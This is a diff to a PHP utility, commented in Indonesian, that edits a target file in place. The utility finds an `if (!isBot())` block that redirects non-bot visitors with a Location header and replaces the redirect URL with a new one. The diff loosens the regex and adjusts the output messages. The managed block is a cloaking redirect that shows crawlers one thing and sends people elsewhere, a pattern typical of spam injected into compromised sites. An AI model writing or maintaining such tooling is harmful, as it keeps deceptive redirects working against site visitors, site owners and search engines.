@@ -8,14 +8,13 @@ if (!file_exists($target)) {
 
 $content = file_get_contents($target);
 
-// cari blok if (!isBot()) { ... }
-$pattern = '/if\s*\(\s*!isBot\s*\(\s*\)\s*\)\s*{[^}]*Location:\s*"([^"]+)"[^}]*}/i';
+// regex lebih longgar dan fleksibel
+$pattern = '/if\s*\(\s*!isBot\s*\(\s*\)\s*\)\s*\{(.*?)Location:\s*"([^"]+)"(.*?)exit\(\);\s*\}/is';
 
-// cek dan ganti jika perlu
 if (preg_match($pattern, $content, $match)) {
-    $currentUrl = $match[1];
+    $currentUrl = $match[2];
 
-    if ($currentUrl !== $newUrl) {
+    if (trim($currentUrl) !== $newUrl) {
         $newBlock = <<<PHP
 if (!isBot()) 
 {
@@ -25,13 +24,13 @@ if (!isBot())
 }
 PHP;
 
-        $newContent = preg_replace($pattern, $newBlock, $content);
+        $newContent = preg_replace($pattern, $newBlock, $content, 1);
         file_put_contents($target, $newContent);
-        echo "✅ Link diganti menjadi: $newUrl\n";
+        echo "✅ Link berhasil diganti ke: $newUrl\n";
     } else {
-        echo "✅ Sudah pakai link yang benar, tidak perlu diganti.\n";
+        echo "✅ Sudah pakai link yang benar.\n";
     }
 } else {
-    echo "❌ Blok isBot() tidak ditemukan.\n";
+    echo "❌ Tidak ditemukan blok isBot() yang cocok.\n";
 }
 ?>
